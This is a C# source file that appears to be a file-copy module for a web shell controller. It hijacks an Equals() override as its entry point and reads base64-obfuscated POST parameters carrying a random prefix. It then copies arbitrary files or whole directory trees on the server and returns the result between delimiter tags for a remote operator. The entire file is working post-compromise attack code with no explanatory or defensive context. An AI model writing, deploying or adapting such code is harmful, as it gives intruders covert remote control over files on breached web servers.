﻿using System;
using System.IO;
using System.Text;
using System.Web;

namespace FM_Copy
{
    public class Run
    {
        public HttpRequest Request;
        public HttpResponse Response;
        public String encoder;
        public String decoder;
        public String cs;
        public String randomPrefix;


        public override bool Equals(object obj)
        {
            this.parseObj(obj);
            this.cs = "UTF-8";
            this.encoder = "base64";
            this.decoder = "";
            this.randomPrefix = "2";
            String tag_s = "->|";
            String tag_e = "|<-";
            this.Response.Charset = cs;
            String result = "";
            try
            {
                if (this.Request.Form["version"] != null)
                {
                    String[] split = System.Text.Encoding.GetEncoding(cs)
                        .GetString(System.Convert.FromBase64String(this.Request.Form["version"])).Split(';');
                    if (split.Length == 1)
                    {
                        this.randomPrefix = split[0];
                    }
                    else
                    {
                        this.randomPrefix = split[0];
                        tag_s = split[1];
                        tag_e = split[2];
                    }
                }

                String path = decode(this.Request.Form["path"]);
                String target = decode(this.Request.Form["target"]);
                result += this.CopyCode(path, target);
            }
            catch (Exception e)
            {
                result = "ERROR:// " + e.Message;
            }

            this.Response.Write(tag_s + asoutput(result) + tag_e);
            return true;
        }

        public void parseObj(Object obj)
        {
            if (obj.GetType().IsArray)
            {
                Object[] data = (Object[])obj;
                this.Request = (HttpRequest)data[0];
                this.Response = (HttpResponse)data[1];
            }
            else
            {
                try
                {
                    HttpContext context = (HttpContext)obj;
                    this.Response = context.Response;
                    this.Request = context.Request;
                }
                catch (Exception)
                {
                    HttpContext context = HttpContext.Current;
                    this.Response = context.Response;
                    this.Request = context.Request;
                }
            }
        }

        public String CopyCode(String S, String D)
        {
            if (Directory.Exists(S))
            {
                DirectoryInfo m = new DirectoryInfo(S);
                Directory.CreateDirectory(D);
                foreach (FileInfo F in m.GetFiles())
                {
                    File.Copy(S + "\\" + F.Name, D + "\\" + F.Name);
                }

                foreach (DirectoryInfo F in m.GetDirectories())
                {
                    CopyCode(S + "\\" + F.Name, D + "\\" + F.Name);
                }
            }
            else
            {
                File.Copy(S, D);
            }

            return "1";
        }

        public String HexAsciiConvert(String hex)
        {
            StringBuilder sb = new StringBuilder();
            int i;
            for (i = 0; i < hex.Length; i += 2)
            {
                sb.Append(System.Convert.ToString(System.Convert.ToChar(Int32.Parse(hex.Substring(i, 2),
                    System.Globalization.NumberStyles.HexNumber))));
            }

            return sb.ToString();
        }

        public String decode(String src)
        {
            int prefixlen = 0;
            try
            {
                prefixlen = Int32.Parse(randomPrefix);
                src = src.Substring(prefixlen);
            }
            catch (Exception e)
            {
            }

            String ret;
            try
            {
                switch (encoder)
                {
                    case "base64":
                    {
                        ret = System.Text.Encoding.GetEncoding(cs).GetString(System.Convert.FromBase64String(src));
                        break;
                    }
                    case "hex":
                    {
                        ret = HexAsciiConvert(src);
                        break;
                    }
                    default:
                    {
                        ret = src;
                        break;
                    }
                }
            }
            catch (Exception e)
            {
                ret = e.Message.ToString();
            }

            return ret;
        }

        public String asoutput(String src)
        {
            String ret;
            try
            {
                switch (decoder)
                {
                    case "base64":
                    {
                        ret = System.Convert.ToBase64String(System.Text.Encoding.GetEncoding(cs).GetBytes(src));
                        break;
                    }
                    default:
                    {
                        ret = src;
                        break;
                    }
                }
            }
            catch (Exception e)
            {
                ret = e.Message.ToString();
            }

            return ret;
        }
    }
}